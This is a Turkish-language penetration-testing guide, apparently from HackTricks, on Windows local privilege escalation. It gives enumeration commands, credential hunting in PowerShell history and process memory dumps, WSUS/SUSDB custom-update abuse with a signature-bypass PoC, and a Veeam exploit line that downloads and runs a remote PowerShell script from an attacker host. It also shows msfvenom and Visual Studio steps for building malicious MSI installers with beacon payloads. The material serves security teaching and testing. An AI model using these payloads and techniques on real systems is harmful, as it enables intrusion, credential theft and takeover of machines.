# Windows Yerel Ayrıcalık Yükseltme

{{#include ../../banners/hacktricks-training.md}}

### **Windows yerel ayrıcalık yükseltme vektörlerini bulmak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Bu sayfa, birkaç temel kılavuzdaki genel Windows ayrıcalık yükseltme metodolojisini bir araya getirir.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Pratik enumeration akışı ayrıca topluluk workshop'larından ve checklist'lerden yararlanır.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Tarihsel saldırı materyali, Windows ayrıcalık yükseltme hakkındaki DerbyCon sunumunu da içerir.<sup>[[5]](#references)</sup>

## Windows Başlangıç Teorisi

### Access Tokens

**Windows access token'larının ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs hakkında daha fazla bilgi için aşağıdaki sayfaya bakın:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows'ta integrity level'ların ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Güvenlik Kontrolleri

Windows'ta **sistemi enumerate etmenizi**, executable'ları çalıştırmanızı veya hatta **faaliyetlerinizi tespit etmelerini** **engelleyebilecek** çeşitli unsurlar vardır. Ayrıcalık yükseltme enumeration'ına başlamadan önce aşağıdaki **sayfayı** **okumalı** ve tüm bu **savunma** **mekanizmalarını** **enumerate etmelisiniz**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fiziksel erişim, offline bir UEFI NVRAM düzenlemesini pre-boot DMA ve Windows `SYSTEM` memory-patching chain'ine de dönüştürebilir:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess` üzerinden başlatılan UIAccess process'leri, AppInfo secure-path kontrolleri bypass edildiğinde prompt olmadan High IL elde etmek için abuse edilebilir. Özel UIAccess/Admin Protection bypass workflow'una buradan bakın:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation, arbitrary bir SYSTEM registry write için abuse edilebilir (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Güncel Windows build'leri ayrıca, privileged local NTLM authentication'ın yeniden kullanılan bir SMB TCP connection üzerinden yansıtıldığı bir **SMB arbitrary-port** LPE path'i de sunmuştur:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Sistem Bilgileri

### Sürüm bilgisi enumeration'ı

Windows sürümünün bilinen bir vulnerability içerip içermediğini kontrol edin (uygulanan patch'leri de kontrol edin).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Sürüm Exploit'leri

Bu [site](https://msrc.microsoft.com/update-guide/vulnerability), Microsoft güvenlik açıkları hakkında ayrıntılı bilgi aramak için kullanışlıdır. Bu veritabanında 4.700'den fazla güvenlik açığı bulunur ve bir Windows ortamının sunduğu **muazzam saldırı yüzeyini** gösterir.

**Sistemde**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas, watson'ı içerir)_

**Sistem bilgileriyle yerel olarak**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploit'lerin Github depoları:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

Ortam değişkenlerinde kayıtlı herhangi bir kimlik bilgisi/Juicy bilgi var mı?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Geçmişi
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript dosyaları

Bunu nasıl etkinleştireceğinizi [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) adresinden öğrenebilirsiniz.
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline yürütmelerinin ayrıntıları; yürütülen komutları, komut çağrılarını ve script'lerin bazı bölümlerini kapsayacak şekilde kaydedilir. Ancak yürütme ayrıntılarının tamamı ve çıktı sonuçları kaydedilmeyebilir.

Bunu etkinleştirmek için dokümantasyondaki "Transcript files" bölümünde yer alan talimatları izleyin ve **"Powershell Transcription"** yerine **"Module Logging"** seçeneğini kullanın.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowerShell günlüklerindeki son 15 olayı görüntülemek için şunu çalıştırabilirsiniz:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Komut dosyasının yürütülmesine ilişkin eksiksiz etkinlik ve tam içerik kaydı tutulur; böylece her kod bloğu çalışırken belgelenir. Bu süreç, adli incelemeler ve kötü amaçlı davranışların analizi için değerli olan her etkinliğe dair kapsamlı bir denetim izi sağlar. Yürütme sırasında tüm etkinlikler belgelenerek süreç hakkında ayrıntılı içgörüler sunulur.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block için günlük kaydı olayları Windows Event Viewer içinde şu yolda bulunabilir: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Son 20 olayı görüntülemek için şunu kullanabilirsiniz:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet Ayarları
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Sürücüler
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Güncellemeler http**S** yerine http kullanılarak isteniyorsa sistemi tehlikeye atabilirsiniz.

Ağın SSL kullanmayan bir WSUS güncellemesi kullanıp kullanmadığını kontrol etmek için cmd üzerinde aşağıdakini çalıştırarak başlarsınız:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Veya PowerShell'de aşağıdakini:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Bunlardan biri gibi bir yanıt alırsanız:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Ve `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` veya `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` değeri `1` ise.

Ardından, **exploit edilebilir durumdadır.** Son registry değeri `0` ise WSUS girdisi yok sayılır.

Bu vulnerability'leri exploit etmek için [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) gibi tool'ları kullanabilirsiniz - Bunlar, SSL olmayan WSUS trafiğine 'fake' update'ler enjekte etmek için kullanılan MiTM weaponized exploit script'leridir.

Araştırmayı buradan okuyabilirsiniz:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Raporun tamamını buradan okuyun**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Temel olarak bu, bug'ın exploit ettiği flaw'dur:

> Local user proxy'mizi değiştirme gücümüz varsa ve Windows Updates, Internet Explorer ayarlarında yapılandırılmış proxy'yi kullanıyorsa, kendi trafiğimizi intercept etmek ve asset'imizde elevated user olarak code çalıştırmak için [PyWSUS](https://github.com/GoSecure/pywsus)'ı local olarak çalıştırma gücüne sahibiz.
>
> Ayrıca WSUS service mevcut user'ın ayarlarını kullandığından certificate store'unu da kullanır. WSUS hostname'i için self-signed bir certificate oluşturup bu certificate'i mevcut user'ın certificate store'una eklersek hem HTTP hem de HTTPS WSUS trafiğini intercept edebiliriz. WSUS, certificate üzerinde trust-on-first-use türü bir validation uygulamak için HSTS benzeri herhangi bir mekanizma kullanmaz. Sunulan certificate user tarafından trusted ise ve doğru hostname'e sahipse service tarafından kabul edilir.

Bu vulnerability'yi [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) tool'unu kullanarak exploit edebilirsiniz (liberated olduğunda).

### SUSDB custom-update abuse: `.txt`/`.esd` üzerinden unsigned payload'lar

Bu, HTTP WSUS connection'ını intercept etmekten farklı bir trust-boundary failure'dır: Ön koşul, custom update publish ve approve etmek için **WSUS database'inin (`SUSDB`) stored procedure'lerine** yeterli erişimdir. Pratik bir giriş yolu, upstream WSUS computer account'unu `SUSDB` barındıran ayrı bir MSSQL server'a relay etmektir; kesin ön koşul deployment'a özgüdür, bu nedenle SQL administrator rights varsaymak yerine önce `EXECUTE` permissions'larını enumerate edin.<sup>[[38]](#references)[[39]](#references)</sup>

WSUS client authentication'ını HTTP/8530'dan LDAP, SMB veya AD CS'ye relay eden ayrı attack path için [WSUS HTTP'yi NTLM relay için abuse etme](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8) bölümüne bakın.

#### Update'i build etme, hedefleme ve approve etme

Custom-update workflow'u, restricted bir publishing API olarak legitimate WSUS procedure'lerini kullanır. Önemli state transition'lar şunlardır:<sup>[[38]](#references)</sup>

| Aşama | İlgili stored procedure'ler |
| --- | --- |
| Update metadata'sını import etme | `spImportUpdate` |
| Prerequisite, localized ve extended XML fragment'larını store etme | `spSaveXMLFragment` |
| Content digest'ini attacker-controlled URL ile ilişkilendirme | `spSetBatchURL` |
| Bir computer group enumerate/create etme ve client'ı ekleme | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Bu group için installation'ı approve etme | `@actionID = 0` ve `@isAssigned = 1` ile `spDeployUpdate` |

File name, digest'ler, size ve `CommandLineInstallation` handler'ı imported metadata/fragments genelinde uyumlu olmalıdır. Content URL'sini ve target group'u assign ettikten sonra final approval aşağıdakine benzer; örnek GUID'leri replay etmek yerine fresh update, group ve deployment identifier'ları kullanın.<sup>[[38]](#references)[[39]](#references)</sup>
```sql
EXEC spDeployUpdate
@updateID = '<update-guid>', @revisionNumber = 1,
@actionID = 0, @targetGroupID = '<group-guid>',
@isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
@adminName = 'Administrator';
```
#### Uzantı güdümlü imza bypass

WSUS normalde rastgele imzalanmamış çalıştırılabilir içeriği reddeder. Ancak `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` içindeki .NET `VerifyFile` yolu, sağlanan dosya adı `.txt` veya `.esd` ile bittiğinde sertifika denetimi bayrağını false olarak ayarlar; ardından `CheckCertificateSignature`, baytların metin veya geçerli bir ESD image olduğunu doğrulamadan atlanır. Bu nedenle, örneğin `payload.exe.txt` olarak adlandırılmış değiştirilmemiş bir PE, içerik doğrulamasından geçebilir ve daha sonra update'in command-line installation handler'ı tarafından çalıştırılabilir. Bu, imza sahteciliği değil, bir policy/type-confusion bug'ıdır.<sup>[[39]](#references)</sup>
```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
checkSignature = false;
if (checkSignature)
CheckCertificateSignature(/* downloaded file */);
```
#### BITS uyumlu staging ve otomasyon

`spDeployUpdate` çağrısı, WSUS'un kayıtlı içeriği fetch etmesini sağlar. Origin, BITS'in HTTP beklentilerini karşılamalıdır: Tek başına erişilebilir bir URL yeterli değildir; çünkü transfer, başlangıçta `HEAD`/`GET` akışı ve byte-range istekleri kullanır. Range desteği olmayan bir sunucu, BITS'in Range protokol başlığını gerektirdiğini belirten WSUS synchronization `EventId=364` olayını üretir.<sup>[[39]](#references)</sup>

Araştırma PoC'si [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious), import/fragment/URL/group/deployment zinciri için gereken SQL'i oluşturur, bunu çalıştırmak üzere değiştirilmiş bir MSSQL client içerir ve içerik staging için `BitsWebServer.py` dosyasını sağlar. Yetkili bir lab ortamında minimal kullanım:<sup>[[40]](#references)</sup>
```bash
python3 NotWSUSpicious.py \
--wsusHostname wsus.lab.local \
--updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
--updateName SecurityUpdate \
--updateFilePath /payloads/payload.exe.txt \
--updateArguments '' \
--computerGroup TestGroup \
--targetComputer workstation.lab.local
python3 BitsWebServer.py
```
#### Kullanıcı müdahalesi olmadan çalıştırma ve yeniden deneme kalıcılığı

Client-side interaction policy'ye bağlıdır. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` altında bulunan `4 - Auto download and schedule install` seçeneği, onaylanmış bir update'in kullanıcı tarafından manuel olarak seçilmesine gerek kalmadan indirilmesini ve yapılandırılmış zamanlamaya göre kurulmasını sağlar. Testlerde, update'i başarısız veya tamamlanmamış durumda kalan bir payload, callback process'i sonlandıktan hemen sonra tekrar sunuldu; bu nedenle retry davranışı tekrarlanan execution persistence haline gelebilir. Bu davranış gürültülüdür, çünkü client bir update-failed durumu gösterir.<sup>[[39]](#references)</sup>

#### Detection ve hardening pivot'ları

Bu chain'den kullanılabilecek server- ve client-side pivot'lar şunlardır:<sup>[[39]](#references)</sup>

- `SUSDB` üzerinde `spCreateTargetGroup`, `spSetBatchURL` ve `spDeployUpdate` execution işlemlerini audit edin; yeni targeting group'larını, external content origin'lerini, `.txt`/`.esd` update payload'larını ve beklenmeyen principal'lar (özellikle computer account olmayan hesaplar) tarafından gerçekleştirilen deployment'ları araştırın.
- `C:\Program Files\Update Services\LogFiles` dizininde `ContentSyncAgent`, `FileVerified`, yanlış yazılmış `FileVerficationFailed` ve `EventId=364` ifadelerini inceleyin; verification işlemini payload extension'ı ve content magic ile ilişkilendirin ve yalnızca suffix'e güvenmeyin.
- Windows Update installation işlemlerinin tekrar tekrar başarısız olup retry etmesini ve `.txt` veya `.esd` adları taşıyan content'ten kaynaklanan PE execution ya da beklenmeyen child/network activity'yi araştırın.
- Desteklendiği durumlarda database service için Extended Protection for Authentication zorunlu kılın ve database network erişimini WSUS server ile yetkili administrative system'lerle sınırlandırın. Custom-update procedure'ları üzerindeki `EXECUTE` haklarını en aza indirin ve audit edin.

## Third-Party Auto-Updater'lar ve Agent IPC (local privesc)

Birçok enterprise agent, localhost üzerinde bir IPC surface ve privileged bir update channel sunar. Enrollment işlemi attacker server'a yönlendirilebiliyor ve updater rogue root CA'ya veya zayıf signer check'lerine güveniyorsa, local user kötü amaçlı bir MSI göndererek SYSTEM service tarafından kurulmasını sağlayabilir. Netskope stAgentSvc chain'i (CVE-2025-0309) temel alınarak hazırlanmış genelleştirilmiş bir technique için buraya bakın:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 üzerinden SYSTEM)

Veeam B&R < `11.0.1.1261`, **TCP/9401** üzerinde attacker-controlled mesajları işleyen bir localhost service sunar ve **NT AUTHORITY\SYSTEM** olarak arbitrary command çalıştırılmasına izin verir.<sup>[[12]](#references)</sup>

- **Recon**: listener ve version'ı doğrulayın; örneğin `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: `VeeamHax.exe` gibi bir PoC'yi gerekli Veeam DLL'leriyle birlikte aynı directory'ye yerleştirin, ardından local socket üzerinden bir SYSTEM payload tetikleyin:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Hizmet komutu SYSTEM olarak çalıştırır.
## KrbRelayUp

Belirli koşullar altında Windows **domain** ortamlarında bir **local privilege escalation** güvenlik açığı bulunur. Bu koşullar arasında **LDAP signing** özelliğinin zorunlu kılınmadığı, kullanıcıların **Resource-Based Constrained Delegation (RBCD)** yapılandırmalarına izin veren self-rights yetkilerine sahip olduğu ve kullanıcıların domain içinde bilgisayar oluşturabilmesinin mümkün olduğu ortamlar yer alır. Bu **requirements**'ların varsayılan ayarlar kullanılarak karşılandığını belirtmek önemlidir.

**Exploit'i** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) adresinde bulun.

Saldırı akışı hakkında daha fazla bilgi için [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup> adresini inceleyin.

## AlwaysInstallElevated

Bu 2 registry girdisi **etkinse** (değer **0x1** ise), herhangi bir yetkiye sahip kullanıcılar `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **yükleyebilir** (çalıştırabilir).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```
Bir meterpreter oturumunuz varsa bu tekniği **`exploit/windows/local/always_install_elevated`** modülünü kullanarak otomatikleştirebilirsiniz.

### PowerUP

Power-up'ın `Write-UserAddMSI` komutunu kullanarak mevcut dizinin içinde ayrıcalıkları yükseltmek için bir Windows MSI binary dosyası oluşturun. Bu script, kullanıcı/grup ekleme istemi gösteren önceden derlenmiş bir MSI installer yazar (bu nedenle GIU erişimine ihtiyacınız olacaktır):
```
Write-UserAddMSI
```
Yetki yükseltmek için oluşturulan binary'yi çalıştırmanız yeterlidir.

### MSI Wrapper

Bu tools ile MSI wrapper oluşturmayı öğrenmek için bu tutorial'ı okuyun. Yalnızca **command lines** **execute** etmek istiyorsanız, "**.bat**" dosyasını da wrap edebileceğinizi unutmayın.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike veya Metasploit ile **new Windows EXE TCP payload** **Generate** edin ve `C:\privesc\beacon.exe` konumuna kaydedin.
- **Visual Studio**'yu açın, **Create a new project** seçeneğini belirleyin ve arama kutusuna "installer" yazın. **Setup Wizard** projesini seçin ve **Next**'e tıklayın.
- Projeye **AlwaysPrivesc** gibi bir ad verin, konum olarak **`C:\privesc`** kullanın, **place solution and project in the same directory** seçeneğini belirleyin ve **Create**'e tıklayın.
- 4 adımlı işlemin 3. adımına (dahil edilecek dosyaları seçme) ulaşana kadar **Next**'e tıklamaya devam edin. **Add**'e tıklayın ve az önce oluşturduğunuz Beacon payload'ını seçin. Ardından **Finish**'e tıklayın.
- **Solution Explorer**'da **AlwaysPrivesc** projesini seçin ve **Properties** bölümünde **TargetPlatform** değerini **x86** yerine **x64** olarak değiştirin.
- **Author** ve **Manufacturer** gibi, yüklenen uygulamanın daha meşru görünmesini sağlayabilecek başka properties'leri de değiştirebilirsiniz.
- Projeye sağ tıklayın ve **View > Custom Actions** seçeneğini belirleyin.
- **Install**'a sağ tıklayın ve **Add Custom Action** seçeneğini belirleyin.
- **Application Folder**'a çift tıklayın, **beacon.exe** dosyanızı seçin ve **OK**'e tıklayın. Bu, installer çalıştırılır çalıştırılmaz beacon payload'ının execute edilmesini sağlar.
- **Custom Action Properties** altında **Run64Bit** değerini **True** olarak değiştirin.
- Son olarak **build** edin.
- `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı gösterilirse platformu x64 olarak ayarladığınızdan emin olun.

### MSI Installation

Kötü amaçlı `.msi` dosyasının **installation** işlemini **background**'da execute etmek için:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Bu güvenlik açığını istismar etmek için şunu kullanabilirsiniz: _exploit/windows/local/always_install_elevated_

## Antivirüs ve Tespit Sistemleri

### Denetim Ayarları

Bu ayarlar nelerin **günlüğe kaydedildiğini** belirler; bu nedenle dikkat etmelisiniz
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding ile logların nereye gönderildiğini bilmek ilginçtir
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**, bilgisayarlara katıldığı domain üzerinde **yerel Administrator parolalarının yönetimi** için tasarlanmıştır ve her parolanın **benzersiz, rastgele oluşturulmuş ve düzenli olarak güncellenmiş** olmasını sağlar. Bu parolalar Active Directory içinde güvenli bir şekilde saklanır ve yalnızca ACL'ler aracılığıyla yeterli izin verilmiş kullanıcılar tarafından erişilebilir; bu sayede yetkili kullanıcılar yerel admin parolalarını görüntüleyebilir.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Etkinse, **düz metin parolalar LSASS'de** (Local Security Authority Subsystem Service) saklanır.\
[**Bu sayfada WDigest hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** ile birlikte Microsoft, Local Security Authority (LSA) için, güvenilmeyen işlemlerin **belleğini okuma** veya kod enjekte etme girişimlerini **engelleyen** gelişmiş koruma özelliğini kullanıma sundu ve böylece sistemi daha güvenli hâle getirdi.\
[**LSA Protection hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard**, **Windows 10**'da kullanıma sunulmuştur. Amacı, bir cihazda depolanan kimlik bilgilerini pass-the-hash attacks gibi tehditlere karşı korumaktır. [**Credential Guard hakkında daha fazla bilgiye buradan ulaşabilirsiniz.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Önbelleğe Alınmış Kimlik Bilgileri

**Etki alanı kimlik bilgileri**, **Local Security Authority** (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının oturum açma verileri kayıtlı bir güvenlik paketi tarafından doğrulandığında, kullanıcı için genellikle etki alanı kimlik bilgileri oluşturulur.\
[**Önbelleğe Alınmış Kimlik Bilgileri hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Kullanıcılar ve Gruplar

### Kullanıcıları ve Grupları Enumerate Etme

Üyesi olduğunuz gruplardan herhangi birinin ilginç izinlere sahip olup olmadığını kontrol etmelisiniz
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Ayrıcalıklı gruplar

**Bazı ayrıcalıklı gruplara üyeyseniz ayrıcalıkları yükseltebilirsiniz**. Ayrıcalıklı gruplar ve bunları ayrıcalıkları yükseltmek için nasıl abuse edebileceğiniz hakkında buradan bilgi edinin:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

Bu sayfada **token** hakkında **daha fazla bilgi edinin**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
**İlginç tokenlar** ve bunları nasıl abuse edebileceğiniz hakkında bilgi edinmek için aşağıdaki sayfaya bakın:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Oturum açmış kullanıcılar / Sessions
```bash
qwinsta
klist sessions
```
### Ana klasörler
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Parola Politikası
```bash
net accounts
```
### Panonun içeriğini al
```bash
powershell -command "Get-Clipboard"
```
## Çalışan İşlemler

### Dosya ve Klasör İzinleri

Her şeyden önce, işlemleri listelerken **işlemin komut satırında parolaları kontrol edin**.\
**Çalışan herhangi bir binary dosyanın üzerine yazıp yazamayacağınızı** veya olası [**DLL Hijacking attacks**](dll-hijacking/index.html) işlemlerinden yararlanmak için binary klasöründe yazma izinlerinizin olup olmadığını kontrol edin:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Her zaman çalışıyor olabilecek [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) olup olmadığını kontrol edin; ayrıcalıkları yükseltmek için bunları kötüye kullanabilirsiniz.

**Process binary'lerinin izinlerini kontrol etme**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**İşlem ikili dosyalarının klasörlerinin izinlerini kontrol etme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

sysinternals içindeki **procdump** aracını kullanarak çalışan bir process'in memory dump'ını oluşturabilirsiniz. FTP gibi servisler **credentials'ı memory'de clear text olarak tutar**; memory'yi dump etmeyi ve credentials'ı okumayı deneyin.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
